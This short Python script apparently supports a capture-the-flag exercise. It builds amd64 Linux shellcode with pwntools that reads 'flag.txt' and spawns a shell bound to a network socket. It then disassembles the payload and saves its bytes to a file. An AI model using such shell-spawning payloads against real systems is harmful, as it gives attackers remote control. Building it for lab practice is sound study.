#/usr/bin/python3

from capstone import *
from pwn import *
from sys import stdout

context(arch = 'amd64', os = 'linux')
shellCode = asm(shellcraft.amd64.linux.cat("flag.txt"))
shellCode += asm(pwnlib.shellcraft.amd64.linux.dupsh(sock = 'rbp'))

md = Cs(CS_ARCH_X86, CS_MODE_64)

for i in md.disasm(shellCode, 0x1000):
    stdout.write(f'{hex(i.address)}\t')
    stdout.write("{:<10}".format(i.mnemonic))
    stdout.write("{:<10}\n".format(i.op_str))

stdout.write(f"\n{len(shellCode)} bytes\n")

output = open('shellcode/cat.shell', 'w')
output.write(f'{len(shellCode)}\n')

for byte in shellCode:
    # Reformat
    temp = str(hex(byte))[2:].zfill(2)
    output.write(f'{temp}\n')
